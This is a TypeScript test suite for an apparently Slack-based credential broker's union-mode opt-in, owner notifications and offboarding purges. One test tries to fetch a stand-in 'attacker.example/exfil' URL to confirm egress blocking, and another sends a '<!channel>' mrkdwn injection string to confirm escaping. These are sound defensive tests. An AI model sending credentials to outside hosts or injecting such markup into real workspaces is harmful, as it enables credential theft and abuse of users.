import { test } from 'node:test';
import assert from 'node:assert/strict';
import { randomBytes } from 'node:crypto';
import { openDb } from '../src/core/db';
import { Vault } from '../src/core/vault';
import { Audit } from '../src/core/audit';
import { Consent } from '../src/core/consent';
import { ChannelConfig } from '../src/core/channelConfig';
import { ChannelTools } from '../src/core/tools';
import { Policy } from '../src/core/policy';
import { ProviderRegistry, defineProvider } from '../src/core/providers';
import { userOwner } from '../src/core/owner';
import { UnionOptin } from '../src/core/unionOptin';
import { handleOAuthCallback } from '../src/core/oauthCallback';
import { disconnectProvider, offboardUser, offboardUserEverywhere, purgePendingForProvider } from '../src/core/offboard';
import { sweepExpired } from '../src/core/sweep';
import { EgressBlockedError, ResponseBlockedError } from '../src/core/injector';
import { ConnectContext, ConsentRequiredError, createVouchr } from '../src/adapters/bolt';

// #112 union-mode explicit opt-in + owner notification.

const KEY = randomBytes(32);
const CALLER = { enterpriseId: null, teamId: 'T1', userId: 'U_CALLER' }; // triggers the request
const ALICE = { enterpriseId: null, teamId: 'T1', userId: 'U_ALICE' };   // the connected member
const tok = (account: string | null = null) =>
  ({ accessToken: 'sk-alice-secret', refreshToken: null, scopes: '', expiresAt: null, externalAccount: account });

const mcp = defineProvider({
  id: 'mcp', authorizeUrl: 'https://x/a', tokenUrl: 'https://x/t', scopesDefault: [],
  egressAllow: ['api.test'], refresh: 'none', pkce: false, clientId: 'c', clientSecret: 's',
});
// A key-credential (no-OAuth) human provider, for the union-join setup prompt path.
const kv = defineProvider({
  id: 'kv', credential: 'key', authorizeUrl: 'https://x/a', tokenUrl: 'https://x/t',
  scopesDefault: [], egressAllow: ['api.test'], refresh: 'none', pkce: false,
});
// A service-to-service tool Vouchr must NOT broker (no union pool either).
const svc = defineProvider({
  id: 'svc', identity: 'service', credential: 'key', authorizeUrl: 'https://x/a', tokenUrl: 'https://x/t',
  scopesDefault: [], egressAllow: ['api.test'], refresh: 'none', pkce: false,
});

/** Direct-ConnectContext harness (mirrors union.test.ts) with the #112 knobs exposed. */
async function ctx(opts: { requiresOptIn?: boolean; members?: string[]; provider?: typeof mcp } = {}) {
  const db = await openDb({ dbPath: ':memory:' });
  const vault = new Vault(db, KEY);
  const audit = new Audit(db);
  const consent = new Consent(db);
  const optin = new UnionOptin(db);
  const cfg = new ChannelConfig(db);
  const posted: any[] = [];
  const members = opts.members ?? ['U_CALLER', 'U_ALICE'];
  const client = {
    users: { info: async () => ({ user: { is_admin: true } }) },
    conversations: {
      info: async () => ({ channel: { id: 'C_FIN', is_channel: true } }),
      members: async () => ({ members }),
    },
    chat: { postEphemeral: async (a: any) => { posted.push(a); }, postMessage: async (a: any) => { posted.push(a); } },
  } as any;
  const registry = new ProviderRegistry([opts.provider ?? mcp]);
  const deps = {
    identity: CALLER, channel: 'C_FIN', client, registry, vault, audit, consent,
    policy: new Policy(), redirectUri: 'http://x', channelConfig: cfg, channelTools: new ChannelTools(db),
    providerIds: ['mcp'], unionOptin: optin, unionRequiresOptIn: opts.requiresOptIn ?? false,
    unionNotified: new Map<string, number>(),
  };
  await cfg.setMode('T1', 'C_FIN', 'mcp', 'union');
  return { c: new ConnectContext(deps), deps, db, vault, audit, consent, optin, cfg, registry, posted };
}

const optinCount = async (db: any) => Number((await db.get(`SELECT COUNT(*) AS n FROM union_optin`)).n);
const dms = (posted: any[], user: string) => posted.filter((m) => m.channel === user && /used by/.test(m.text ?? ''));

// ── Part 1: resolution filter ─────────────────────────────────────────────────────────────────────

test('union opt-in (flag on): a connected but NOT opted-in member is never selected — caller gets the Connect prompt', async () => {
  const { c, vault, posted } = await ctx({ requiresOptIn: true });
  await vault.upsert(userOwner(ALICE), 'mcp', tok('alice@example.com')); // connected, NOT opted in
  await assert.rejects(() => c.connect('mcp'), ConsentRequiredError);
  assert.equal(posted.length, 1); // the normal Connect prompt (which doubles as the opt-in moment)
  // Informed consent: the union-channel prompt discloses the opt-in side effect and the way out.
  const blocks = JSON.stringify(posted[0].blocks);
  assert.match(blocks, /union.* mode.*usable for other members/);
  assert.match(blocks, /\/vouchr union leave mcp/);
});

test('the connect prompt carries NO union disclosure outside union mode', async () => {
  const { c, cfg, posted } = await ctx();
  await cfg.setMode('T1', 'C_FIN', 'mcp', 'per-user');
  await assert.rejects(() => c.connect('mcp'), ConsentRequiredError);
  assert.ok(!JSON.stringify(posted[0].blocks).includes('union'));
});

test('union opt-in (flag on): an opted-in connected member is selected; opt-in is channel-scoped', async () => {
  const { c, vault, optin } = await ctx({ requiresOptIn: true });
  await vault.upsert(userOwner(ALICE), 'mcp', tok('alice@example.com'));
  await optin.join(ALICE, 'C_OTHER', 'mcp'); // a different channel's opt-in must NOT count here
  await assert.rejects(() => c.connect('mcp'), ConsentRequiredError);
  await optin.join(ALICE, 'C_FIN', 'mcp'); // THIS channel's opt-in makes her eligible
  const handle = await c.connect('mcp');
  assert.equal(await handle.account(), 'alice@example.com');
});

test('union opt-in (flag off/default): resolution ignores opt-in rows — byte-compatible with today', async () => {
  const { c, vault } = await ctx(); // flag absent → default false
  await vault.upsert(userOwner(ALICE), 'mcp', tok('alice@example.com')); // connected, never opted in
  const handle = await c.connect('mcp');
  assert.equal(await handle.account(), 'alice@example.com'); // still borrowable, exactly as before
});

test('union opt-in: leave takes effect on the very next resolution', async () => {
  const { c, vault, optin } = await ctx({ requiresOptIn: true });
  await vault.upsert(userOwner(ALICE), 'mcp', tok('alice@example.com'));
  await optin.join(ALICE, 'C_FIN', 'mcp');
  assert.ok(await c.connect('mcp')); // eligible while joined
  await optin.leave(ALICE, 'C_FIN', 'mcp');
  await assert.rejects(() => c.connect('mcp'), ConsentRequiredError); // immediately ineligible
});

test('union opt-in: disconnect and offboard remove eligibility immediately', async () => {
  const { c, db, vault, audit, consent, optin } = await ctx({ requiresOptIn: true });
  await vault.upsert(userOwner(ALICE), 'mcp', tok('alice@example.com'));
  await optin.join(ALICE, 'C_FIN', 'mcp');
  assert.ok(await c.connect('mcp'));

  // Disconnect drops the provider's opt-in rows with the credential (no resurrection on reconnect).
  await disconnectProvider(vault, audit, undefined, ALICE, 'mcp', optin);
  assert.equal(await optinCount(db), 0);
  await assert.rejects(() => c.connect('mcp'), ConsentRequiredError);

  // Offboarding purges ALL of the user's opt-ins alongside consent/sessions.
  await vault.upsert(userOwner(ALICE), 'mcp', tok());
  await optin.join(ALICE, 'C_FIN', 'mcp');
  await optin.join(ALICE, 'C_OTHER', 'mcp');
  await offboardUser(vault, audit, consent, ALICE, undefined, 'offboarded', undefined, optin);
  assert.equal(await optinCount(db), 0);
});

// ── Opt-in recording at the OAuth callback (consent → callback → vault → resolution, TEST-2) ─────

test('consent → callback → resolution: connecting from a union-mode channel records the opt-in', async () => {
  const { c, db, vault, audit, consent, optin, cfg, registry } = await ctx({ requiresOptIn: true });
  // Alice clicks the Connect prompt that was posted IN the union channel: the consent row carries it.
  const { state } = await consent.begin(ALICE, mcp, 'http://x', 'C_FIN');
  const realFetch = globalThis.fetch;
  globalThis.fetch = (async () => new Response(JSON.stringify({ access_token: 'sk-alice-secret' }),
    { status: 200, headers: { 'content-type': 'application/json' } })) as any;
  try {
    const res = await handleOAuthCallback(
      { registry, vault, audit, consent, redirectUri: 'http://x', channelConfig: cfg, unionOptin: optin },
      'thecode', state,
    );
    assert.equal(res.ok, true);
  } finally {
    globalThis.fetch = realFetch;
  }
  // The opt-in row exists for exactly (T1, C_FIN, U_ALICE, mcp), and it was audited as a union join.
  const row = (await db.get(`SELECT * FROM union_optin`)) as any;
  assert.equal(row.team_id, 'T1');
  assert.equal(row.channel_id, 'C_FIN');
  assert.equal(row.user_id, 'U_ALICE');
  assert.equal(row.provider, 'mcp');
  const joins = (await db.all(`SELECT meta FROM audit WHERE action='union'`)) as any[];
  assert.equal(joins.length, 1);
  assert.match(joins[0].meta, /"event":"join"/);
  assert.ok(!joins[0].meta.includes('sk-alice-secret')); // SEC-1: no secret in the audit row

  // And with the flag ON, the caller's next request resolves to Alice through that opt-in.
  const handle = await c.connect('mcp');
  const realFetch2 = globalThis.fetch;
  globalThis.fetch = (async () => new Response('ok', { status: 200 })) as any;
  try { await handle.fetch('https://api.test/x'); } finally { globalThis.fetch = realFetch2; }
  const inject = (await db.get(`SELECT user_id, actor FROM audit WHERE action='inject'`)) as any;
  assert.equal(inject.user_id, 'U_ALICE'); // borrowed member is the audited actor, as before
  assert.equal(inject.actor, 'U_CALLER');
});

test('callback records NO opt-in when the prompting channel is not in union mode (or no channel at all)', async () => {
  const { db, vault, audit, consent, optin, cfg, registry } = await ctx({ requiresOptIn: true });
  await cfg.setMode('T1', 'C_FIN', 'mcp', 'per-user'); // union mode OFF for this channel now
  const a = await consent.begin(ALICE, mcp, 'http://x', 'C_FIN');
  const b = await consent.begin(CALLER, mcp, 'http://x', null); // a DM connect: no channel context
  const realFetch = globalThis.fetch;
  globalThis.fetch = (async () => new Response(JSON.stringify({ access_token: 'sk-alice-secret' }),
    { status: 200, headers: { 'content-type': 'application/json' } })) as any;
  try {
    const deps = { registry, vault, audit, consent, redirectUri: 'http://x', channelConfig: cfg, unionOptin: optin };
    assert.equal((await handleOAuthCallback(deps, 'thecode', a.state)).ok, true);
    assert.equal((await handleOAuthCallback(deps, 'thecode', b.state)).ok, true);
  } finally {
    globalThis.fetch = realFetch;
  }
  assert.equal(await optinCount(db), 0); // connected fine, but no delegation was implied
});

// ── Part 2: owner notification ────────────────────────────────────────────────────────────────────

test('owner DM: fires on ACTUAL use (fetch), not at resolution; debounced to one per hour of real use', async () => {
  const { c, deps, vault, optin, posted } = await ctx({ requiresOptIn: true });
  await vault.upsert(userOwner(ALICE), 'mcp', tok('alice@example.com'));
  await optin.join(ALICE, 'C_FIN', 'mcp');

  // Resolution alone injects nothing: no DM, and the debounce window is NOT consumed (PR #171 P2).
  const handle = await c.connect('mcp');
  assert.equal(dms(posted, 'U_ALICE').length, 0);

  const realFetch = globalThis.fetch;
  // Non-2xx on purpose: ANY returned Response means the credential was injected and used.
  globalThis.fetch = (async () => new Response('boom', { status: 500 })) as any;
  try {
    assert.equal((await handle.fetch('https://api.test/x')).status, 500); // Response passes through
    assert.equal(dms(posted, 'U_ALICE').length, 1); // the first REAL use gets the DM
    const dm = dms(posted, 'U_ALICE')[0];
    assert.match(dm.text, /Your mcp connection was used by <@U_CALLER> in <#C_FIN> just now/);
    assert.match(dm.text, /\/vouchr audit/);            // review pointer
    assert.match(dm.text, /\/vouchr union leave mcp/);  // withdrawal pointer
    assert.match(dm.text, /courtesy/);                  // the audit table is the record, not the DM
    assert.ok(!dm.text.includes('sk-alice-secret'));    // SEC-1: never the token

    // More real uses within the hour — same handle AND a fresh per-request context sharing the
    // createVouchr-scoped debounce map — send no second DM.
    await handle.fetch('https://api.test/x');
    await (await new ConnectContext(deps).connect('mcp')).fetch('https://api.test/x');
    assert.equal(dms(posted, 'U_ALICE').length, 1);
  } finally {
    globalThis.fetch = realFetch;
  }
});

test('owner DM: a THROWN fetch (egress-denied) never notifies — the credential never served the request', async () => {
  const { c, vault, optin, posted } = await ctx({ requiresOptIn: true });
  await vault.upsert(userOwner(ALICE), 'mcp', tok('alice@example.com'));
  await optin.join(ALICE, 'C_FIN', 'mcp');
  const handle = await c.connect('mcp');
  await assert.rejects(() => handle.fetch('https://attacker.example/exfil'), EgressBlockedError);
  assert.equal(dms(posted, 'U_ALICE').length, 0); // thrown path: no injection, no DM, no debounce burn
});

// #110's response guard throws ResponseBlockedError AFTER injection — the provider call happened
// and the inject audit row exists — so the owner DM must still fire for a response-blocked use.
test('owner DM: a response-blocked use (real #110 guard, post-injection) still notifies; the error re-throws', async () => {
  // Same provider id, plus the real response-constraints knob: only JSON responses may pass.
  const strict = defineProvider({
    id: 'mcp', authorizeUrl: 'https://x/a', tokenUrl: 'https://x/t', scopesDefault: [],
    egressAllow: ['api.test'], refresh: 'none', pkce: false, clientId: 'c', clientSecret: 's',
    egressResponse: { allowContentTypes: ['application/json'] },
  });
  const { c, vault, optin, posted } = await ctx({ requiresOptIn: true, provider: strict });
  await vault.upsert(userOwner(ALICE), 'mcp', tok('alice@example.com'));
  await optin.join(ALICE, 'C_FIN', 'mcp');
  const handle = await c.connect('mcp');
  const realFetch = globalThis.fetch;
  try {
    // text/html violates the allowlist → the REAL injector guard throws post-fetch.
    globalThis.fetch = (async () => new Response('<html/>', { status: 200, headers: { 'content-type': 'text/html' } })) as any;
    await assert.rejects(() => handle.fetch('https://api.test/x'), ResponseBlockedError);
    assert.equal(dms(posted, 'U_ALICE').length, 1); // response withheld, but the credential WAS used

    // A subsequent SUCCESSFUL use within the hour shares the debounce: still one DM total.
    globalThis.fetch = (async () => new Response('{}', { status: 200, headers: { 'content-type': 'application/json' } })) as any;
    await handle.fetch('https://api.test/x');
    assert.equal(dms(posted, 'U_ALICE').length, 1);
  } finally {
    globalThis.fetch = realFetch;
  }
});

test('owner DM: never fires when the union resolution serves the caller themself', async () => {
  const { c, vault, optin, posted } = await ctx({ requiresOptIn: true, members: ['U_CALLER'] });
  await vault.upsert(userOwner(CALLER), 'mcp', tok('caller@example.com'));
  await optin.join(CALLER, 'C_FIN', 'mcp');
  const handle = await c.connect('mcp'); // resolves to the caller's own credential
  assert.equal(await handle.account(), 'caller@example.com');
  const realFetch = globalThis.fetch;
  globalThis.fetch = (async () => new Response('ok', { status: 200 })) as any;
  try { await handle.fetch('https://api.test/x'); } finally { globalThis.fetch = realFetch; }
  assert.equal(dms(posted, 'U_CALLER').length, 0); // even a real self-use sends nothing
});

test('owner DM failures never break the fetch path (async rejection AND sync throw)', async () => {
  const breakages = [
    (client: any) => { client.chat.postMessage = async () => { throw new Error('slack down'); }; },
    (client: any) => { client.chat.postMessage = () => { throw new Error('sync boom'); }; }, // not even a Promise
  ];
  for (const breakClient of breakages) {
    const { c, deps, vault, optin } = await ctx({ requiresOptIn: true });
    await vault.upsert(userOwner(ALICE), 'mcp', tok('alice@example.com'));
    await optin.join(ALICE, 'C_FIN', 'mcp');
    breakClient(deps.client);
    const handle = await c.connect('mcp');
    const realFetch = globalThis.fetch;
    globalThis.fetch = (async () => new Response('ok', { status: 200 })) as any;
    try {
      // The DM send fails at use time; the provider Response must come back untouched.
      assert.equal((await handle.fetch('https://api.test/x')).status, 200);
    } finally {
      globalThis.fetch = realFetch;
    }
  }
});

// ── Stale-opt-in purges beyond disconnect/offboard: TTL sweep, Grid discovery, break-glass ───────

test('TTL sweep: an expired user credential takes its union opt-ins with it', async () => {
  const db = await openDb({ dbPath: ':memory:' });
  const vault = new Vault(db, KEY, { idleMs: 1000 });
  const audit = new Audit(db);
  const consent = new Consent(db);
  const optin = new UnionOptin(db);
  await vault.upsert(userOwner(ALICE), 'mcp', tok());
  await optin.join(ALICE, 'C_FIN', 'mcp');
  await db.run('UPDATE connection SET last_used_at=? WHERE provider=?', [Date.now() - 5000, 'mcp']);
  assert.equal(await sweepExpired(vault, audit, consent), 1);
  assert.equal(await optinCount(db), 0); // delegation did not outlive the credential
});

test('Grid offboarding discovers an opt-in-ONLY user (no connection/consent/grant) and purges the rows', async () => {
  const db = await openDb({ dbPath: ':memory:' });
  const optin = new UnionOptin(db);
  await optin.join(ALICE, 'C_FIN', 'mcp'); // the only trace of Alice anywhere
  const summary = await offboardUserEverywhere(db, new Vault(db, KEY), new Audit(db), new Consent(db), { userId: 'U_ALICE' });
  assert.deepEqual(summary.map((s) => s.teamId), ['T1']); // found via the union_optin discovery arm
  assert.equal(await optinCount(db), 0);
});

test('break-glass purge clears stale opt-ins but keeps ones backed by a live connection', async () => {
  const db = await openDb({ dbPath: ':memory:' });
  const vault = new Vault(db, KEY);
  const optin = new UnionOptin(db);
  const BOB = { enterpriseId: null, teamId: 'T1', userId: 'U_BOB' };
  await vault.upsert(userOwner(ALICE), 'mcp', tok()); // Alice still holds a live mcp credential
  await optin.join(ALICE, 'C_FIN', 'mcp');
  await optin.join(BOB, 'C_FIN', 'mcp'); // Bob has no connection row: stale delegation
  await purgePendingForProvider(db, { provider: 'mcp' });
  const rows = (await db.all(`SELECT user_id FROM union_optin ORDER BY user_id`)) as any[];
  assert.deepEqual(rows.map((r) => r.user_id), ['U_ALICE']); // stale gone, live-backed kept
});

// ── /vouchr union join|leave (Slack surface) ──────────────────────────────────────────────────────

async function commandHarness() {
  process.env.VOUCHR_MASTER_KEY = randomBytes(32).toString('base64');
  const lan = await createVouchr({ providers: [mcp, kv, svc], baseUrl: 'http://127.0.0.1:1', dbPath: ':memory:' });
  let handler: any;
  lan.registerCommands({ command: (_n: string, h: any) => (handler = h), view: () => undefined, action: () => undefined });
  const run = async (text: string) => {
    const out: any[] = [];
    await handler({
      command: { team_id: 'T1', user_id: 'U_A', channel_id: 'C_FIN', trigger_id: 't', text },
      ack: async () => {}, respond: async (m: any) => out.push(m), client: {},
    });
    return out[0];
  };
  return { lan, run };
}

test('/vouchr union join/leave lifecycle: connect-first prompt, row + audit on join, immediate leave', async () => {
  const { lan, run } = await commandHarness();

  assert.match(String((await run('union')).text ?? (await run('union'))), /Usage/);

  // join without a connected credential → the normal Connect prompt, and NO row was written.
  const prompt = await run('union join mcp');
  assert.match(prompt.text, /Connect your mcp account first/);
  assert.match(JSON.stringify(prompt.blocks), /https:\/\/x\/a/); // the authorize link
  assert.equal(await optinCount(lan.db), 0);
  // The consent row carries THIS channel; the callback records an opt-in only when the channel is
  // in union mode for the provider at completion time (not configured in this harness — see the
  // callback tests above for both outcomes).
  const pending = (await lan.db.get(`SELECT channel FROM consent_request`)) as any;
  assert.equal(pending.channel, 'C_FIN');

  // Key providers get the key-setup prompt instead of an OAuth link.
  assert.match((await run('union join kv')).text, /Set up your kv access first/);
  // Service tools have no union pool at all.
  assert.match(String(await run('union join svc')), /service-to-service/);

  // With a connected credential, join records the row and audits it.
  await lan.vault.upsert(userOwner({ enterpriseId: null, teamId: 'T1', userId: 'U_A' }), 'mcp', tok());
  assert.match(String(await run('union join mcp')), /Joined the \*mcp\* union pool/);
  assert.equal(await optinCount(lan.db), 1);
  await run('union join mcp'); // idempotent re-join: no duplicate row, no duplicate audit
  assert.equal(await optinCount(lan.db), 1);
  const joins = (await lan.db.all(`SELECT meta FROM audit WHERE action='union'`)) as any[];
  assert.equal(joins.length, 1);
  assert.match(joins[0].meta, /"channel":"C_FIN"/);
  assert.match(joins[0].meta, /"event":"join"/);

  // leave: immediate, audited; a second leave is a no-op with an honest message.
  assert.match(String(await run('union leave mcp')), /Left the \*mcp\* union pool/);
  assert.equal(await optinCount(lan.db), 0);
  const events = (await lan.db.all(`SELECT meta FROM audit WHERE action='union' ORDER BY at`)) as any[];
  assert.equal(events.length, 2);
  assert.match(events[1].meta, /"event":"leave"/);
  assert.match(String(await run('union leave mcp')), /weren't in the \*mcp\* union pool/);
});

test("SEC-4: a forged provider in `union join` is rejected before any persist or audit (and SEC-5-escaped in the echo)", async () => {
  const { lan, run } = await commandHarness();
  const out = String((await run('union join <!channel>')).text ?? (await run('union join <!channel>')));
  assert.match(out, /Unknown provider/);
  assert.ok(out.includes('&lt;!channel&gt;'), 'echoed id must be mrkdwn-escaped');
  assert.ok(!out.includes('<!channel>'), 'raw mrkdwn injection must not survive');
  assert.equal(await optinCount(lan.db), 0); // nothing persisted
  const audits = (await lan.db.all(`SELECT provider FROM audit`)) as any[];
  assert.equal(audits.length, 0); // and nothing audited with the forged string
});
